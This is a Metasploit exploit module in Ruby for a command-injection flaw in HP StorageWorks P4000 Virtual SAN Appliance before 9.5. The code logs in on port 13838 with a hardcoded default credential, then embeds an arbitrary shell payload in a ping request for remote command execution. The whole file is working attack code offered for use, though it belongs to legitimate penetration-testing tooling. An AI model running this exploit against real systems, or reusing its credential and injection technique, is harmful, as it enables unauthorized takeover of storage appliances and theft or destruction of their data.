##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'           => "HP StorageWorks P4000 Virtual SAN Appliance Command Execution",
			'Description'    => %q{
					This module exploits a vulnerability found in HP's StorageWorks P4000 VSA,
				versions prior to 9.5.  By using a default account credential, it is possible
				to inject arbitrary commands as part of a ping request via port 13838.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Nicolas Gregoire',  #Discovery, PoC, additional assistance
					'sinn3r'             #Metasploit
				],
			'References'     =>
				[
					['EDB', '18893'],
					['URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?loc=en_US&id=958'],
					['URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c03082086']
				],
			'Payload'        =>
				{
					'BadChars' => "/",
					'Compat'   =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl telnet bash'
						}
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "none"
				},
			'Platform'       => ['unix', 'linux'],
			'Arch'           => ARCH_CMD,
			'Targets'        =>
				[
					['HP VSA prior to 9.5', {}]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Nov 11 2011",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('RPORT', [true, 'The remote port', 13838])
			], self.class)
	end


	def generate_packet(data)
		pkt = "\x00\x00\x00\x00\x00\x00\x00\x01"
		pkt << [data.length + 1].pack("N*")
		pkt << "\x00\x00\x00\x00"
		pkt << "\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt << "\x00\x00\x00\x14\xff\xff\xff\xff"
		pkt << data
		pkt << "\x00"

		pkt
	end


	def exploit
		connect

		# Login packet
		print_status("Sending login packet")
		packet = generate_packet("login:/global$agent/L0CAlu53R/Version \"8.5.0\"")
		sock.put(packet)
		res = sock.get_once
		vprint_status(Rex::Text.to_hex_dump(res)) if res

		# Command execution
		print_status("Sending injection")
		data = "get:/lhn/public/network/ping/127.0.0.1/foobar;#{payload.encoded}/"
		packet = generate_packet(data)
		sock.put(packet)
		res = sock.get_once
		vprint_status(Rex::Text.to_hex_dump(res)) if res

		handler
		disconnect
	end
end